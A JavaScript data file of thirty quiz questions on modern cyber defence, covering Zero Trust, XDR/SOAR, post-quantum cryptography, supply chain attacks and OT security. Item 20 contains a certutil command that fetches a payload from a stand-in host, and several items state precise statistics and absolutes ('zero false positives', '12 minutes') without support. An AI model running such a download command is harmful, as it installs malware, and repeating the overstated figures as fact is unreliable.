const questions = [
  {
    id: 1,
    question: "How has the enterprise cyber attack surface expanded over the past decade?",
    shortAnswer: "From traditional on-premises data centers with static perimeters to distributed multi-cloud architectures, edge IoT sensors, 5G cellular infrastructure, remote endpoints, third-party software supply chains, and autonomous AI agents.",
    explanation: "This dissolution of the traditional network boundary requires shifting from 'Castle-and-Moat' defense to Zero Trust Architecture.",
    hint: "Multi-cloud, edge IoT, 5G, software supply chains, and autonomous AI agents.",
    level: "Basic",
    codeExample: `// Attack Surface Multipliers:
// Legacy: [On-Prem DMZ Firewalls]
// Modern: [Multi-Cloud (AWS/Azure) + Edge IoT + Supply Chains + Autonomous AI Tools]`
  },
  {
    id: 2,
    question: "What is Time-to-Exploit (TTE) Compression and why does it render manual SOC response obsolete?",
    shortAnswer: "TTE Compression refers to the dramatic reduction in time between a zero-day vulnerability being disclosed and automated adversary botnets scanning and exploiting it across the internet—collapsing from 45 days in 2018 to under 15 minutes in 2026.",
    explanation: "Human SOC analysts taking 30 minutes to triage an alert arrive too late; autonomous AI-SOAR playbooks must execute sub-second containment.",
    hint: "Time between vulnerability disclosure and automated exploitation has dropped from weeks to minutes.",
    level: "Basic",
    codeExample: `// TTE Velocity:
// 2018: CVE published ➔ 45 days until automated in-the-wild exploitation
// 2026: CVE published ➔ 12 minutes until global automated botnet exploitation 🚨`
  },
  {
    id: 3,
    question: "What is the Defender's Dilemma versus the Attacker's Advantage in asymmetric cyber warfare?",
    shortAnswer: "The Defender must protect 100% of all endpoints, APIs, accounts, and networks 24/7/365 without a single error. The Attacker needs to identify only ONE unpatched vulnerability or misconfigured credential once to achieve initial breach.",
    explanation: "This fundamental asymmetry forces modern defenders to adopt Zero Trust ('Assume Breach') rather than relying on perimeter prevention alone.",
    hint: "Defender must defend everything all the time; attacker only needs one flaw.",
    level: "Basic",
    codeExample: `// Asymmetry:
// Defender Target : Protect 50,000 assets * 24h * 365d (100% success required)
// Attacker Target : Find 1 misconfigured S3 bucket (1 single success required)`
  },
  {
    id: 4,
    question: "What are Autonomous AI Attack Swarms and how do they operate across the Cyber Kill Chain?",
    shortAnswer: "Autonomous AI swarms are multi-agent LLM systems programmed by adversaries to execute reconnaissance, scan for exposed endpoints, synthesize polymorphic malware, execute exploits, and perform lateral movement at machine speed with zero human intervention.",
    explanation: "AI swarms compress hours of manual adversary operations into seconds.",
    hint: "Multi-agent AI programs executing end-to-end attacks autonomously at machine speed.",
    level: "Moderate",
    codeExample: `// Autonomous AI Swarm Pipeline:
// Agent_Recon → Agent_Exploit → Agent_PrivEsc → Agent_Exfil (Completed in 140 seconds)`
  },
  {
    id: 5,
    question: "What are the four pillars of Next-Generation Cyber Defense?",
    shortAnswer: "1. Zero Trust Architecture (NIST SP 800-207); 2. AI-Driven XDR and Automated SOAR; 3. Post-Quantum Cryptography (PQC); 4. Phishing-Resistant Identity (FIDO2 WebAuthn Passkeys).",
    explanation: "These four pillars counter machine-speed AI attacks and future quantum decryption capabilities.",
    hint: "Zero Trust, AI-SOAR/XDR, Post-Quantum Cryptography, and FIDO2 Passkeys.",
    level: "Basic",
    codeExample: `// Next-Gen Defense Framework:
// [Enterprise Fabric] ➔ { Zero Trust, AI-SOAR Automation, PQC Encryption, FIDO2 Passkeys }`
  },
  {
    id: 6,
    question: "What is the 'Assume Breach' mindset in modern cybersecurity architecture?",
    shortAnswer: "An architectural philosophy that assumes adversaries have already penetrated the internal network. Defense focus shifts from keeping attackers out of the perimeter to micro-segmentation, continuous authentication, least privilege, and rapid blast-radius containment.",
    explanation: "Assuming breach prevents a single compromised workstation from escalating into a catastrophic enterprise-wide ransomware disaster.",
    hint: "Designing defenses under the assumption that attackers are already inside the internal network.",
    level: "Basic",
    codeExample: `// Assume Breach Doctrine:
// Internal Network is treated as UNTRUSTED (Identical to the public Internet).`
  },
  {
    id: 7,
    question: "What is the 'Harvest Now, Decrypt Later' (HNDL) quantum threat vector?",
    shortAnswer: "Adversaries intercept and record encrypted network traffic (TLS, VPNs, financial transfers) today, storing the encrypted ciphertext in vast data repositories. When cryptanalytically relevant quantum computers (CRQCs) arrive, they will execute Shor's Algorithm to decrypt all historical traffic.",
    explanation: "This makes post-quantum cryptography migration urgent today for data with long secrecy lifespans (e.g., military, banking, intelligence).",
    hint: "Adversaries store encrypted traffic now to decrypt it once quantum computers arrive.",
    level: "Moderate",
    codeExample: `// HNDL Lifecycle:
// 2026: Record RSA-2048 encrypted state data ➔ Store on Petabyte array
// 2032: Quantum Computer with Shor's Algorithm decrypts all 2026 secrets!`
  },
  {
    id: 8,
    question: "What is Extended Detection and Response (XDR) and how does it advance beyond traditional EDR and SIEM?",
    shortAnswer: "XDR correlates security telemetry across multiple disparate layers (Endpoints, Cloud Workloads, Network Traffic, Identity Providers, and Email Gateways) using machine learning, providing unified threat detection and cross-domain automated response.",
    explanation: "Traditional EDR only sees endpoints; XDR connects endpoint signals with cloud API logs and identity telemetry.",
    hint: "Correlates telemetry across endpoints, cloud, identity, network, and email into a unified defense system.",
    level: "Moderate",
    codeExample: `// XDR Telemetry Fusion:
// [Endpoint EDR] + [Cloud API Logs] + [Identity IdP] + [Network NetFlow] ➔ AI Correlation Engine ➔ Unified Incident Graph`
  },
  {
    id: 9,
    question: "What is Security Orchestration, Automation, and Response (SOAR) and what is a Playbook?",
    shortAnswer: "SOAR connects disparate security tools through automated workflows. A Playbook is a pre-programmed, standardized sequence of automated actions (e.g., quarantine endpoint, revoke JWT session, block IP at firewall) triggered automatically when a high-confidence alert is generated.",
    explanation: "SOAR enables sub-second incident containment without waiting for human analyst intervention.",
    hint: "Automated response platform executing pre-defined workflows (Playbooks) in milliseconds.",
    level: "Moderate",
    codeExample: `// SOAR Playbook Trigger:
// Event: Ransomware detected on Host 10.14.2.8
// Action 1: Isolate Host from Network (CrowdStrike API)
// Action 2: Revoke User OAuth Tokens (Entra ID API)
// Action 3: Snapshot Memory for Forensics (AWS API)`
  },
  {
    id: 10,
    question: "What is Software Supply Chain Security and how do attacks like SolarWinds and XZ-Utils operate?",
    shortAnswer: "Attackers inject malicious backdoors into upstream open-source packages, build pipelines, or third-party vendor updates. When downstream enterprise customers install legitimate, signed updates, the malicious code executes inside thousands of protected perimeters simultaneously.",
    explanation: "Supply chain attacks bypass perimeter firewalls because the malware arrives inside trusted, digitally signed vendor software.",
    hint: "Injecting backdoors into trusted software dependencies or vendor build pipelines.",
    level: "Moderate",
    codeExample: `// Supply Chain Vector:
// Attacker poisons open-source NPM library ➔ Vendor builds app ➔ 5,000 Enterprises download signed update with backdoor!`
  },
  {
    id: 11,
    question: "What is Software Bill of Materials (SBOM) under executive cyber security mandates?",
    shortAnswer: "An SBOM is a formalized, machine-readable inventory of all software components, open-source libraries, modules, and dependencies utilized in building an application (standardized in CycloneDX or SPDX formats).",
    explanation: "When a new zero-day vulnerability (like Log4j) emerges, an SBOM allows security teams to instantly identify which applications contain the vulnerable library.",
    hint: "Machine-readable ingredients list of all libraries and dependencies in a software application.",
    level: "Basic",
    codeExample: `// CycloneDX SBOM JSON:
// { "bomFormat": "CycloneDX", "components": [ { "name": "log4j-core", "version": "2.14.1", "purl": "pkg:maven/org.apache..." } ] }`
  },
  {
    id: 12,
    question: "How has Generative AI revolutionized Social Engineering and Spear-Phishing campaigns?",
    shortAnswer: "Adversaries use LLMs to automate highly tailored, grammatically flawless spear-phishing emails written in local dialects, mimicking executive writing styles from public communications, paired with real-time cloned voice notes and deepfake video calls.",
    explanation: "GenAI eliminates traditional phishing indicators (spelling errors, awkward phrasing), driving click-through rates up dramatically.",
    hint: "Generates flawless, culturally tailored emails and cloned executive voices at scale.",
    level: "Basic",
    codeExample: `// GenAI Phishing Automation:
// Input: Target LinkedIn Bio + Executive Press Releases → LLM synthesizes personalized urgent transfer request → Zero spelling errors!`
  },
  {
    id: 13,
    question: "What is Adversarial Machine Learning and what is the difference between Data Poisoning and Evasion Attacks?",
    shortAnswer: "Adversarial ML attacks AI models directly. Data Poisoning (Training-time attack): Injecting corrupted or malicious training data to create secret backdoors. Evasion Attack (Inference-time attack): Crafting subtle, imperceptible perturbations in inputs (e.g., malware binary bytes) that cause the AI classifier to misclassify malicious files as benign.",
    explanation: "Securing the AI lifecycle requires validating training pipelines and testing models against adversarial perturbations.",
    hint: "Poisoning corrupts training data; Evasion crafts subtle input tweaks to trick trained classifiers.",
    level: "Expert",
    codeExample: `// Evasion Perturbation:
// Malicious PE Binary + Subtle NOP bytes → AI Model Confidence: "99.8% BENIGN" → Malware bypasses AV!`
  },
  {
    id: 14,
    question: "What is the MITRE ATT&CK Framework and how does it categorize adversary Tactics, Techniques, and Procedures (TTPs)?",
    shortAnswer: "MITRE ATT&CK is a globally accessible knowledge base of real-world adversary behaviors structured across 14 tactical objectives (from Initial Access and Execution to Lateral Movement and Exfiltration) with hundreds of granular techniques (e.g., T1059 Command and Scripting Interpreter).",
    explanation: "ATT&CK provides a standardized taxonomy for mapping defensive coverage against known threat actor methodologies.",
    hint: "Standardized matrix mapping real-world adversary tactics and techniques across all attack stages.",
    level: "Moderate",
    codeExample: `// MITRE Matrix Progression:
// Initial Access (T1566) ➔ Execution (T1059) ➔ Persistence (T1547) ➔ Privilege Escalation (T1068) ➔ Lateral Movement (T1021)`
  },
  {
    id: 15,
    question: "What is the Cyber Kill Chain model developed by Lockheed Martin?",
    shortAnswer: "A 7-stage linear framework modeling adversary operations: 1. Reconnaissance; 2. Weaponization; 3. Delivery; 4. Exploitation; 5. Installation; 6. Command and Control (C2); 7. Actions on Objectives.",
    explanation: "Disrupting an adversary at ANY single stage of the chain neutralizes the entire attack.",
    hint: "7 stages: Recon, Weaponize, Deliver, Exploit, Install, C2, and Actions on Objectives.",
    level: "Basic",
    codeExample: `// Kill Chain Interruption:
// Block Delivery (Email Gateway) OR Block C2 (DNS Sinkhole) ➔ Attack completely defeated ✔`
  },
  {
    id: 16,
    question: "What is Operational Technology (OT) and SCADA cyber security and why is IT/OT convergence high risk?",
    shortAnswer: "OT/SCADA controls physical industrial machinery (power grids, water treatment plants, ordnance manufacturing). IT/OT convergence connects air-gapped industrial controllers (PLCs) to corporate IT networks and cloud telemetry, exposing legacy unencrypted protocols (Modbus, DNP3) to internet-borne ransomware.",
    explanation: "A cyber incident in OT results in physical equipment destruction, environmental contamination, or loss of human life.",
    hint: "Connecting industrial machinery to IT networks exposes legacy unencrypted protocols to ransomware.",
    level: "Moderate",
    codeExample: `// IT/OT Risk:
// Corporate IT Phishing → Lateral Jump across IT/OT Gateway → Modbus packet overrides turbine RPM → Physical Explosion! 🚨`
  },
  {
    id: 17,
    question: "What is Micro-Segmentation in Next-Gen Network Defense?",
    shortAnswer: "Dividing data center and cloud workloads into granular, isolated security zones down to individual host or container levels, enforcing strict Layer-7 policies that block unauthorized east-west lateral movement.",
    explanation: "If an adversary compromises one web server, micro-segmentation prevents them from accessing adjacent database servers.",
    hint: "Isolating workloads into granular zones to stop lateral movement between servers.",
    level: "Moderate",
    codeExample: `// Micro-segmentation Rule:
// Web_Container_A CANNOT communicate with Web_Container_B on Port 22/445 (Lateral movement blocked 🛡️)`
  },
  {
    id: 18,
    question: "What is Cyber Threat Intelligence (CTI) and what is the difference between Strategic, Tactical, and Operational CTI?",
    shortAnswer: "CTI is actionable evidence-based knowledge about cyber threats. Strategic: High-level trends and financial risks for executive leadership. Tactical: Adversary TTPs and attack patterns for SOC architects. Operational: Technical Indicators of Compromise (IoCs: IP addresses, file hashes, domains) ingested by firewalls.",
    explanation: "CTI enables proactive threat hunting rather than purely reactive incident response.",
    hint: "Strategic for executives, Tactical for architects (TTPs), Operational for firewalls (IoCs).",
    level: "Moderate",
    codeExample: `// CTI Levels:
// Strategic   : "Ransomware groups targeting West Bengal financial sector"
// Tactical    : "Actors using Evilginx AitM reverse proxies (MITRE T1111)"
// Operational : "Block malicious C2 IP: 198.51.100.44 (SHA256: 8f9a2b...)"`
  },
  {
    id: 19,
    question: "What is Threat Hunting and how does it differ from automated SIEM alerting?",
    shortAnswer: "Threat Hunting is a proactive, hypothesis-driven human-led search across enterprise networks and endpoint telemetry to detect hidden, stealthy adversaries that have already bypassed automated SIEM and antivirus detection.",
    explanation: "Automated SIEM reacts to known signatures; Threat Hunters assume the network is already breached and search for subtle anomalies.",
    hint: "Proactive human-led search for stealthy adversaries that bypassed automated alerts.",
    level: "Moderate",
    codeExample: `// Threat Hunting Hypothesis:
// "Adversaries are using PowerShell Living-off-the-Land binaries (LOLBins) to execute base64 scripts in memory."`
  },
  {
    id: 20,
    question: "What is Living off the Land (LotL) / LOLBins in advanced cyber attacks?",
    shortAnswer: "Adversaries execute malicious actions using legitimate, pre-installed administrative operating system utilities (e.g., PowerShell, WMI, Certutil, Bitsadmin, MSBuild) rather than dropping custom malware binaries on disk.",
    explanation: "Because LotL binaries are signed by Microsoft or Apple, traditional signature antivirus tools cannot detect them easily.",
    hint: "Using built-in legitimate OS tools (PowerShell, Certutil) to execute attacks without dropping malware.",
    level: "Moderate",
    codeExample: `// LOLBin Example:
// certutil.exe -urlcache -split -f "https://evil.com/payload.exe" payload.exe (Legitimate tool downloading malware)`
  },
  {
    id: 21,
    question: "What is Autonomous Cyber Defense in next-generation military and enterprise networks?",
    shortAnswer: "Self-defending network architectures where AI agents autonomously detect anomalous behaviors, reconfigure software-defined firewalls, patch live vulnerabilities in memory, isolate compromised subnets, and deploy honeypot decoys within milliseconds of attack detection.",
    explanation: "Autonomous defense matches the millisecond execution speed of automated adversarial AI swarms.",
    hint: "Self-defending AI systems that autonomously isolate threats and patch networks in milliseconds.",
    level: "Expert",
    codeExample: `// Autonomous Response:
// AI Sensor detects lateral probe → Instantly reroutes attacker traffic to dynamic honeypot container → Generates threat signature.`
  },
  {
    id: 22,
    question: "What is the Pyramid of Pain in threat hunting and intelligence analysis?",
    shortAnswer: "A model illustrating how difficult it is for an adversary to change specific indicators when a defender blocks them: Hash Values (Trivial); IP Addresses (Easy); Domain Names (Simple); Network/Host Artifacts (Annoying); Tools (Challenging); TTPs (Tough/Painful).",
    explanation: "Blocking an attacker's TTPs forces them to re-train and re-engineer their entire operational methodology.",
    hint: "Pyramid ranking indicators by how hard they are for attackers to change; TTPs are at the top.",
    level: "Moderate",
    codeExample: `// Pyramid of Pain Hierarchy:
// [TOP]    TTPs (Tactics, Techniques & Procedures) → Hardest for attacker to change!
//          Tools (Mimikatz, Cobalt Strike)
//          Domains & IPs
// [BOTTOM] Hash Values (MD5/SHA256) → Trivial for attacker to change`
  },
  {
    id: 23,
    question: "What is Post-Quantum Cryptography (PQC) and what are the two main mathematical families standardizing in NIST FIPS 203/204?",
    shortAnswer: "PQC develops cryptographic algorithms secure against both quantum and classical computers. The two dominant families are Lattice-Based Cryptography (ML-KEM / CRYSTALS-Kyber for encryption, and ML-DSA / CRYSTALS-Dilithium for signatures) and Hash-Based Signatures (SLH-DSA / SPHINCS+).",
    explanation: "Lattice problems (Learning With Errors - LWE) are mathematically intractable for Shor's Algorithm.",
    hint: "Lattice-based (ML-KEM/Kyber, ML-DSA/Dilithium) and Hash-based (SLH-DSA/SPHINCS+) cryptography.",
    level: "Expert",
    codeExample: `// NIST PQC Standards (2024):
// FIPS 203: ML-KEM (CRYSTALS-Kyber) - Key Encapsulation Mechanism
// FIPS 204: ML-DSA (CRYSTALS-Dilithium) - Digital Signatures
// FIPS 205: SLH-DSA (SPHINCS+) - Stateless Hash-based Signatures`
  },
  {
    id: 24,
    question: "What is Cyber Resilience and how does it differ from traditional Cyber Security?",
    shortAnswer: "Cyber Security focuses on preventing attacks and protecting perimeters. Cyber Resilience acknowledges that breaches and disruptions are inevitable, focusing on the ability of an organization to sustain essential business operations, absorb the shock, and rapidly recover during an ongoing attack.",
    explanation: "Resilience emphasizes immutable backups, disaster recovery, and operational continuity under hostile conditions.",
    hint: "Security focuses on prevention; Resilience focuses on surviving and sustaining operations during an attack.",
    level: "Basic",
    codeExample: `// Security vs Resilience:
// Security   : "Block the ransomware from entering."
// Resilience : "If ransomware locks 50 servers, fail over to immutable replicas in 60 seconds with zero data loss."`
  },
  {
    id: 25,
    question: "What are Air-Gapped Networks and how do adversaries bridge them using acoustic, optical, or USB vectors?",
    shortAnswer: "Air-gapped networks are physically isolated with zero connection to the internet. Adversaries bridge air-gaps using infected USB drop attacks (Stuxnet), ultrasonic acoustic transmission between speakers and microphones, or optical LED micro-blinking exfiltration.",
    explanation: "Physical isolation alone is insufficient without strict device control and electromagnetic shielding (TEMPEST).",
    hint: "Physically isolated networks bridged via infected USB drives, ultrasonic sound, or optical signals.",
    level: "Expert",
    codeExample: `// Air-Gap Bridge Vector:
// Infected Contractor USB → Stuxnet executes on PLC → Modbus manipulates centrifuge speeds.`
  },
  {
    id: 26,
    question: "What is Cloud Security Posture Management (CSPM) and Cloud Workload Protection (CWPP)?",
    shortAnswer: "CSPM: Continuously monitors cloud infrastructure (AWS/Azure) for misconfigurations, compliance drift, and overly permissive IAM roles. CWPP: Secures active containers, VMs, and serverless functions at runtime against memory injection and anomalous processes.",
    explanation: "Combining CSPM (control plane) and CWPP (data plane runtime) provides complete Cloud-Native Application Protection (CNAPP).",
    hint: "CSPM checks cloud configurations and compliance; CWPP protects active runtime containers and VMs.",
    level: "Moderate",
    codeExample: `// CSPM Alert:
// "S3 Bucket 'barrackpore-treasury-backup' is publicly readable to the internet 🚨 Auto-Remediating..."`
  },
  {
    id: 27,
    question: "What is Honey-Token / Deception Technology in proactive cyber defense?",
    shortAnswer: "Decoy assets (fake database credentials, canary AWS API keys, dummy documents) deployed throughout an enterprise network. Because legitimate users have no reason to access these tokens, ANY interaction instantly triggers a 100% true-positive SOC breach alert.",
    explanation: "Honey-tokens produce zero false positives and trap adversaries during lateral movement.",
    hint: "Decoy credentials or files that trigger instant high-priority alerts when touched by an attacker.",
    level: "Moderate",
    codeExample: `// Honey-Token Deployment:
// Fake AWS API key placed in git repo → Attacker queries AWS with key → Automated alarm alerts SOC instantly!`
  },
  {
    id: 28,
    question: "What is Zero-Day Vulnerability Brokering and how does the underground exploit market operate?",
    shortAnswer: "A private underground and state-sponsored gray market where zero-day software exploits (e.g., zero-click iOS remote code execution) are bought and sold for millions of rupees (up to ₹20,00,00,000+ per exploit chain) by commercial spyware vendors and intelligence agencies.",
    explanation: "This commercialization provides well-funded adversaries with military-grade exploit chains.",
    hint: "Underground and commercial markets where undiscovered zero-day exploits sell for millions.",
    level: "Moderate",
    codeExample: `// Zero-Day Valuation:
// iOS Zero-Click RCE Chain : Valued at ~₹25,00,00,000 in international exploit markets.`
  },
  {
    id: 29,
    question: "In the Barrackpore Industrial Zone case study, 40 manufacturing plants connected legacy SCADA controllers to a shared cloud telemetry hub. What three-layered Next-Gen defense architecture was instituted?",
    shortAnswer: "1. Zero Trust Micro-segmentation isolating each industrial plant subnet with unidirectional security gateways (data diodes). 2. AI-driven behavioral telemetry baselining detecting anomalous Modbus control commands. 3. Hardware FIDO2 WebAuthn keys enforcing AAL3 authentication for all remote engineering access.",
    explanation: "This prevented lateral malware movement while preserving real-time cloud analytics.",
    hint: "Zero Trust micro-segmentation with data diodes, AI behavioral anomaly detection, and FIDO2 keys.",
    level: "Expert",
    codeExample: `// Industrial Defense Architecture:
// Layer 1: Hardware Data Diodes (One-way outbound telemetry only)
// Layer 2: AI Modbus Protocol Anomaly Detection
// Layer 3: FIDO2 Hardware Passkeys for SCADA engineers`
  },
  {
    id: 30,
    question: "Write out the comprehensive Next-Generation Cyber Security Evolution Roadmap spanning 2026 to 2035.",
    shortAnswer: "Phase 1 (2026-2027): Complete Zero Trust (NIST SP 800-207) enforcement, total password deprecation via FIDO2 passkeys, and AI-SOAR automation. Phase 2 (2028-2030): Full migration to NIST Post-Quantum Cryptography (ML-KEM, ML-DSA) and automated SBOM supply chain verification. Phase 3 (2031-2035): Quantum Key Distribution (QKD) fiber backbones, autonomous AI cyber defense swarms, and decentralized blockchain identity.",
    explanation: "This strategic roadmap ensures institutional resilience against both emerging artificial intelligence and quantum computing threats.",
    hint: "Phase 1: Zero Trust & FIDO2; Phase 2: Post-Quantum Cryptography & SBOM; Phase 3: QKD & Autonomous AI defense.",
    level: "Expert",
    codeExample: `// Next-Gen Security Roadmap:
// 2026-2027 : Zero Trust Architecture + FIDO2 Passkeys + AI-SOAR
// 2028-2030 : Post-Quantum Cryptography (ML-KEM / ML-DSA) + CycloneDX SBOM
// 2031-2035 : Quantum Key Distribution (QKD) + Autonomous AI Defense Swarms`
  }
];

export default questions;
